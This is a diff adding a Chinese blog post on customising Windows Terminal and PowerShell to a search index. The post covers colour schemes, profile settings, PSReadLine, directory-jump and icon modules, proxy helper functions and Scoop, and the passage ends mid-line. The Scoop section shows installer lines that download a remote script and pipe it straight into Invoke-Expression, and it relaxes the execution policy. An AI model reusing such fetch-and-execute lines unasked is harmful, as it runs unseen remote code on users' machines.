@@ -387,6 +387,210 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows Termianl 美化配置指北</title>
+    <url>/articles/dffc1475/</url>
+    <content><![CDATA[<h2 id="Windows-Terminal-介绍"><a href="#Windows-Terminal-介绍" class="headerlink" title="Windows Terminal 介绍"></a>Windows Terminal 介绍</h2><blockquote>
+<p>  官方github地址：<a href="https://github.com/microsoft/terminal">https://github.com/microsoft/terminal</a></p>
+<p>  少数派：<a href="https://sspai.com/post/59380">https://sspai.com/post/59380</a></p>
+</blockquote>
+<p>新晋 Windows 终端模拟器：<a href="https://github.com/microsoft/terminal">Windows Terminal</a>，自发布以来就备受开发者的喜爱，并与 <a href="https://sspai.com/post/43813">WSL</a> 一起，让不少先前非 Linux 不用的开发者朋友们向 Windows 倾斜。Windows Terminal 不仅开源免费，还拥有现代化的界面、完整的字体字符渲染机制（包括 Emoji）、GPU 加速和 Fluent 设计风格。这些都让 Windows Terminal 成为 Windows 平台最先进的终端模拟器，力压一众第三方终端以及 Windows 自带的默认终端。</p>
+<ul>
+<li>  支持WSL2，SSH，Powershell，cmd和其他命令行</li>
+<li>  多个选项卡和拆分窗格</li>
+<li>  搜索框</li>
+<li>  自定义键绑定</li>
+<li>  GPU加速文字渲染</li>
+<li>  美观的新字体Cascadia Code</li>
+<li>  资源使用率低（每个选项卡通常10MB）</li>
+<li>  自动更新（如果使用Microsoft Store）</li>
+</ul>
+<p>Windows Terminal 2.0 开发路线图：<a href="https://github.com/microsoft/terminal/blob/main/doc/terminal-v2-roadmap.md">https://github.com/microsoft/terminal/blob/main/doc/terminal-v2-roadmap.md</a></p>
+<h2 id="安装-Windows-Terminal"><a href="#安装-Windows-Terminal" class="headerlink" title="安装 Windows Terminal"></a>安装 Windows Terminal</h2><p>在官方 <a href="https://github.com/microsoft/terminal">README</a> 中，安装Windows Terminal有如下方法：</p>
+<ul>
+<li><p>  <strong>Microsoft Store</strong>（推荐）</p>
+</li>
+<li><p><strong>Github</strong> </p>
+<p>  <a href="https://github.com/microsoft/terminal/releases">https://github.com/microsoft/terminal/releases</a></p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Add-AppxPackage Microsoft.WindowsTerminal_&lt;versionNumber&gt;.msixbundle</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>winget</strong> </p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winget install --id=Microsoft.WindowsTerminal -e</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>Chocolatey</strong></p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">choco install microsoft-windows-terminal</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>Scoop</strong></p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scoop bucket add extras</span><br><span class="line">scoop install windows-terminal</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这里使用Microsoft Store进行安装，简单直接，还能自动更新【doge】</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/2022/02/202202071644240407.png" alt="image-20220207200021516"></p>
+<h2 id="Windows-Terminal-配置"><a href="#Windows-Terminal-配置" class="headerlink" title="Windows Terminal 配置"></a>Windows Terminal 配置</h2><blockquote>
+<p>  官方配置文档：<a href="https://docs.microsoft.com/zh-cn/windows/terminal/customize-settings/profile-general">https://docs.microsoft.com/zh-cn/windows/terminal/customize-settings/profile-general</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl + ，进入设置页面</span><br><span class="line">目前版本已经实现大部分内容的可视化设置。。。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入设置界面后，左下角点击设置按钮，即可编辑setting.json文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="窗口设置"><a href="#窗口设置" class="headerlink" title="窗口设置"></a>窗口设置</h3><blockquote>
+<p>  通过坐标 “initialPosition”参数 控制窗口位置。</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;initialCols&quot;</span>: <span class="number">97</span>,</span><br><span class="line"><span class="string">&quot;initialPosition&quot;</span>: <span class="string">&quot;480,250&quot;</span>,</span><br><span class="line"><span class="string">&quot;initialRows&quot;</span>: <span class="number">27</span>，</span><br></pre></td></tr></table></figure>
+
+<h3 id="颜色配置"><a href="#颜色配置" class="headerlink" title="颜色配置"></a>颜色配置</h3><blockquote>
+<p>  在线预览颜色配置：<a href="https://windowsterminalthemes.dev/">https://windowsterminalthemes.dev/</a></p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// one，自用配色，修改自one of hack</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#001B26&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#282C34&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#61AFEF&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#5A6374&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#61AFEF&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#56B6C2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#98C379&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#C678DD&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#E06C75&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#DCDFE4&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#E5C07B&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#56B6C2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#DCDFE4&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#98C379&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;One&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#C678DD&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#E06C75&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;selectionBackground&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#DCDFE4&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#E5C07B&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Profile配置"><a href="#Profile配置" class="headerlink" title="Profile配置"></a>Profile配置</h3><blockquote>
+<p>  已实现可视化配置。</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 个人使用配置</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;acrylicOpacity&quot;</span>: <span class="number">0.6</span>,</span><br><span class="line">    <span class="attr">&quot;backgroundImage&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">&quot;backgroundImageOpacity&quot;</span>: <span class="number">0.0</span>,</span><br><span class="line">    <span class="attr">&quot;bellStyle&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;window&quot;</span>,</span><br><span class="line">        <span class="string">&quot;taskbar&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;closeOnExit&quot;</span>: <span class="string">&quot;graceful&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;colorScheme&quot;</span>: <span class="string">&quot;One&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;D:/PowerShell/7/pwsh.exe -nologo&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#AEAFAD&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cursorShape&quot;</span>: <span class="string">&quot;filledBox&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;font&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;face&quot;</span>: <span class="string">&quot;CaskaydiaCove NF&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;size&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;xxxx-xxxx-xxx-xxx-xxx-xxxx-xxxx&#125;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;historySize&quot;</span>: <span class="number">9001</span>,</span><br><span class="line">    <span class="attr">&quot;icon&quot;</span>: <span class="string">&quot;D:\\PowerShell\\7\\assets\\StoreLogo.png&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PowerShell&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;padding&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;snapOnInput&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;startingDirectory&quot;</span>: <span class="string">&quot;%USERPROFILE%/Desktop&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;suppressApplicationTitle&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;useAcrylic&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="字体配置"><a href="#字体配置" class="headerlink" title="字体配置"></a>字体配置</h3><blockquote>
+<p>  字体下载：<a href="https://www.nerdfonts.com/font-downloads">https://www.nerdfonts.com/font-downloads</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Caskaydia Cove Nerd Font</span><br><span class="line">Hack Nerd Font</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PowerShell-配置"><a href="#PowerShell-配置" class="headerlink" title="PowerShell 配置"></a>PowerShell 配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑 profile 文件</span><br><span class="line">code $PROFILE</span><br></pre></td></tr></table></figure>
+
+<h3 id="PSFzf"><a href="#PSFzf" class="headerlink" title="PSFzf"></a>PSFzf</h3><blockquote>
+<p>  终端下的文件查找工具</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> PSReadLine  <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PSFzf</span></span><br><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> PSFzf</span><br><span class="line"><span class="built_in">Set-PSFzfOption</span> <span class="literal">-PSReadlineChordProvider</span> <span class="string">&#x27;Ctrl+f&#x27;</span> <span class="literal">-PSReadlineChordReverseHistory</span> <span class="string">&#x27;Ctrl+r&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="PSReadLine"><a href="#PSReadLine" class="headerlink" title="PSReadLine"></a>PSReadLine</h3><blockquote>
+<p>  历史命令提示</p>
+  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> PSReadLine  <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>
+
+<p>  PS：如果powershell的版本大于等于6，将自动包含最新的PSReadLine，不需要再单独安装</p>
+  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$PSVersionTable</span> <span class="comment"># 查看powershell版本</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Import-Module</span></span><br><span class="line"><span class="built_in">Import-Module</span> PSReadLine</span><br><span class="line"><span class="comment"># # PSReadLine Option</span></span><br><span class="line"><span class="comment"># Set-PSReadLineOption -EditMode Emacs</span></span><br><span class="line"><span class="comment"># Set-PSReadLineOption -BellStyle None</span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span></span><br><span class="line"><span class="comment"># Set-PSReadLineOption -PredictionViewStyle ListView</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Chord</span> <span class="string">&#x27;Ctrl+d&#x27;</span> <span class="literal">-Function</span> DeleteChar </span><br><span class="line"><span class="comment"># 设置向上键为后向搜索历史记录</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> UpArrow <span class="literal">-Function</span> HistorySearchBackward</span><br><span class="line"><span class="comment"># 设置向下键为前向搜索历史纪录</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> DownArrow <span class="literal">-Function</span> HistorySearchForward</span><br><span class="line"><span class="comment"># 设置 Tab 键补全</span></span><br><span class="line"><span class="comment"># Set-PSReadlineKeyHandler -Key Tab -Function Complete</span></span><br><span class="line"><span class="comment"># # 设置 Ctrl+d 为退出 PowerShell</span></span><br><span class="line"><span class="comment"># # Set-PSReadlineKeyHandler -Key &quot;Ctrl+d&quot; -Function ViExit</span></span><br><span class="line"><span class="comment"># # 设置 Ctrl+z 为撤销</span></span><br><span class="line"><span class="comment"># Set-PSReadLineKeyHandler -Key &quot;Ctrl+z&quot; -Function Undo</span></span><br><span class="line"><span class="comment"># # 设置向上键为后向搜索历史记录</span></span><br><span class="line"><span class="comment"># Set-PSReadLineKeyHandler -Key UpArrow -Function HistorySearchBackward</span></span><br><span class="line"><span class="comment"># # 设置向下键为前向搜索历史纪录</span></span><br><span class="line"><span class="comment"># Set-PSReadLineKeyHandler -Key DownArrow -Function HistorySearchForward</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-Colors</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Command             = <span class="string">&quot;#e5c07b&quot;</span></span><br><span class="line">    Number              = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Member              = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Operator            = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    <span class="built_in">Type</span>                = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    Variable            = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    <span class="keyword">Parameter</span>           = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    ContinuationPrompt  = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Default             = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Emphasis            = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Selection           = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Comment             = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Keyword             = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    String              = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    InlinePrediction    = <span class="string">&quot;#9f9193&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>zsh-Autosuggestion除了可以使用<code>→</code>键补全全部外，还可以使用<code>ctrl + →</code>选择下一个单词。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># powershell-PSReadLine实现方式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Chord</span> <span class="string">&quot;Ctrl+RightArrow&quot;</span> <span class="literal">-Function</span> ForwardWord</span><br></pre></td></tr></table></figure>
+
+<h3 id="ZLocation-目录跳转"><a href="#ZLocation-目录跳转" class="headerlink" title="ZLocation - 目录跳转"></a>ZLocation - 目录跳转</h3><blockquote>
+<p>  <a href="https://github.com/vors/ZLocation">https://github.com/vors/ZLocation</a></p>
+<p>  类似于linux下的autojump</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> ZLocation <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> z</span><br></pre></td></tr></table></figure>
+
+<p>usage：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z &lt;dir_name&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Terminal-Icons"><a href="#Terminal-Icons" class="headerlink" title="Terminal-Icons"></a>Terminal-Icons</h3><blockquote>
+<p>  <a href="https://github.com/devblackops/Terminal-Icons">https://github.com/devblackops/Terminal-Icons</a></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> Terminal<span class="literal">-Icons</span> <span class="literal">-Repository</span> PSGallery</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> Terminal<span class="literal">-Icons</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/2022/02/202202071644240410.png" alt="image-20220207211444500"></p>
+<h3 id="命令行流量代理"><a href="#命令行流量代理" class="headerlink" title="命令行流量代理"></a>命令行流量代理</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:all_proxy <span class="string">&quot;socks5://127.0.0.1:10808&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetClashProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:all_proxy <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetBurpProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:http_proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">	<span class="built_in">Set-Item</span> Env:https_proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UnSetBurpProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Remove-Item</span> Env:http_proxy</span><br><span class="line">	<span class="built_in">Remove-Item</span> Env:https_proxy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UnSetProxy</span></span> &#123;</span><br><span class="line">    <span class="built_in">Remove-Item</span> Env:all_proxy</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="自定义提示符"><a href="#自定义提示符" class="headerlink" title="自定义提示符"></a>自定义提示符</h3><h4 id="starship"><a href="#starship" class="headerlink" title="starship"></a>starship</h4><blockquote>
+<p>  starship 安装</p>
+<p>  <code>scoop install starship</code></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -----------starship----------</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> (&amp;starship init powershell)</span><br></pre></td></tr></table></figure>
+
+<h4 id="pshazz"><a href="#pshazz" class="headerlink" title="pshazz"></a>pshazz</h4><blockquote>
+<p>  pshazz 安装</p>
+<p>  <code>scoop install pshazz</code></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------pshazz----------</span></span><br><span class="line"><span class="keyword">try</span> &#123; <span class="variable">$null</span> = <span class="built_in">gcm</span> pshazz <span class="literal">-ea</span> stop; pshazz init <span class="string">&#x27;default&#x27;</span> &#125; <span class="keyword">catch</span> &#123; &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="oh-my-posh3"><a href="#oh-my-posh3" class="headerlink" title="oh-my-posh3"></a>oh-my-posh3</h4><blockquote>
+<p>  oh-my-posh3 配置</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装 posh-git </span></span><br><span class="line"><span class="built_in">Install-Module</span> posh<span class="literal">-git</span>  <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"><span class="comment"># 安装 oh-my-posh</span></span><br><span class="line"><span class="built_in">Install-Module</span> <span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh</span> <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># scoop安装方式</span></span><br><span class="line">scoop install <span class="built_in">oh</span><span class="literal">-my</span><span class="literal">-posh3</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ----------command----------- </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prompt</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">#Write-Host(&quot;$pwd&gt;&quot;)</span></span><br><span class="line">    <span class="comment"># &quot;syyu@win &quot; + &quot;$pwd ~ `n $ &quot;</span></span><br><span class="line">    <span class="string">&quot; syyu@win &quot;</span> + <span class="string">&quot;<span class="variable">$pwd</span> `n <span class="variable">$</span> &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="winfetch"><a href="#winfetch" class="headerlink" title="winfetch"></a>winfetch</h3><blockquote>
+<p>  一款花里胡哨的基本信息查看工具，类似的有 neofetch，screenfetch</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scoop install winfetch</span><br></pre></td></tr></table></figure>
+
+<h2 id="Scoop"><a href="#Scoop" class="headerlink" title="Scoop"></a>Scoop</h2><h3 id="scoop安装"><a href="#scoop安装" class="headerlink" title="scoop安装"></a>scoop安装</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://get.scoop.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or shorter</span></span><br><span class="line"><span class="built_in">iwr</span> <span class="literal">-useb</span> get.scoop.sh | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure>
+
+<p>Note: if you get an error you might need to change the execution policy (i.e. enable Powershell) with</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned <span class="literal">-scope</span> CurrentUser</span><br></pre></td></tr></table></figure>
+
+<h3 id="scoop-Usage"><a href="#scoop-Usage" class="headerlink" title="scoop Usage"></a>scoop Usage</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: scoop &lt;command&gt; [&lt;args&gt;]</span><br><span class="line"></span><br><span class="line">Some useful commands are:</span><br><span class="line"></span><br><span class="line">alias       Manage scoop aliases</span><br><span class="line">bucket      Manage Scoop buckets</span><br><span class="line">cache       Show or clear the download cache</span><br><span class="line">cat         Show content of specified manifest.</span><br><span class="line">checkup     Check for potential problems</span><br><span class="line">cleanup     Cleanup apps by removing old versions</span><br><span class="line">config      Get or set configuration values</span><br><span class="line">create      Create a custom app manifest</span><br><span class="line">depends     List dependencies for an app</span><br><span class="line">export      Exports (an importable) list of installed apps</span><br><span class="line">help        Show help for a command</span><br><span class="line">hold        Hold an app to disable updates</span><br><span class="line">home        Opens the app homepage</span><br><span class="line">info        Display information about an app</span><br><span class="line">install     Install apps</span><br><span class="line">list        List installed apps</span><br><span class="line">prefix      Returns the path to the specified app</span><br><span class="line">reset       Reset an app to resolve conflicts</span><br><span class="line">search      Search available apps</span><br><span class="line">status      Show status and check for new app versions</span><br><span class="line">unhold      Unhold an app to enable updates</span><br><span class="line">uninstall   Uninstall an app</span><br><span class="line">update      Update apps, or Scoop itself</span><br><span class="line">virustotal  Look for app&#x27;s hash on virustotal.com</span><br><span class="line">which       Locate a shim/executable (similar to &#x27;which&#x27; on Linux)</span><br><span class="line"></span><br><span class="line">Type &#x27;scoop help &lt;command&gt;&#x27; to get help for a specific command.</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="scoop配置指南"><a href="#scoop配置指南" class="headerlink" title="scoop配置指南"></a>scoop配置指南</h3><p>见另一篇博客 </p>
+<p>#TODO</p>
+<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><ul>
+<li>  <strong>win + 反引号（`）</strong></li>
+</ul>
+<blockquote>
+<p>  打开Quake模式</p>
+</blockquote>
+<ul>
+<li>  配置专注模式（eg: <strong>Alt + P</strong>)</li>
+</ul>
+<blockquote>
+<p>  显示/隐藏标题栏，在Quake模式（win + 反引号）也可触发</p>
+</blockquote>
+<ul>
+<li>  分屏操作</li>
+</ul>
+<blockquote>
+<p>  <a href="https://docs.microsoft.com/zh-cn/windows/terminal/panes">https://docs.microsoft.com/zh-cn/windows/terminal/panes</a></p>
+<p>  Alt + Shift + (+)  水平窗格</p>
+<p>  Alt + Shift + (-)  垂直窗格</p>
+<p>  …</p>
+</blockquote>
+<p>and so on …</p>
+<p>#TODO</p>
+<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="Windows-Terminal"><a href="#Windows-Terminal" class="headerlink" title="Windows Terminal"></a>Windows Terminal</h3><blockquote>
+<p>   C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.WindowsTerminal_xxxxxxxxxxxxx\LocalState\settings.json</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>#TODO</p>
+<h3 id="PowerShell-7"><a href="#PowerShell-7" class="headerlink" title="PowerShell 7"></a>PowerShell 7</h3><blockquote>
+<p>  C:\Users\%USERNAME%\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SetProxy</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:all_proxy <span class="string">&quot;socks5://127.0.0.1:10808&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetClashProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:all_proxy <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetBurpProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:http_proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">	<span class="built_in">Set-Item</span> Env:https_proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UnSetBurpProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Remove-Item</span> Env:http_proxy</span><br><span class="line">	<span class="built_in">Remove-Item</span> Env:https_proxy</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UnSetProxy</span></span> &#123;</span><br><span class="line">    <span class="built_in">Remove-Item</span> Env:all_proxy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Import-Module</span></span><br><span class="line"><span class="built_in">Import-Module</span> PSReadLine</span><br><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> Terminal<span class="literal">-Icons</span></span><br><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> z</span><br><span class="line"><span class="comment"># Import-Module -Name PSFzf</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span></span><br><span class="line"><span class="comment"># Set-PSReadLineOption -PredictionViewStyle ListView</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Chord</span> <span class="string">&#x27;Ctrl+d&#x27;</span> <span class="literal">-Function</span> DeleteChar </span><br><span class="line"><span class="comment"># 设置向上键为后向搜索历史记录</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> UpArrow <span class="literal">-Function</span> HistorySearchBackward</span><br><span class="line"><span class="comment"># 设置向下键为前向搜索历史纪录</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> DownArrow <span class="literal">-Function</span> HistorySearchForward</span><br><span class="line"><span class="comment"># 设置ctrl + 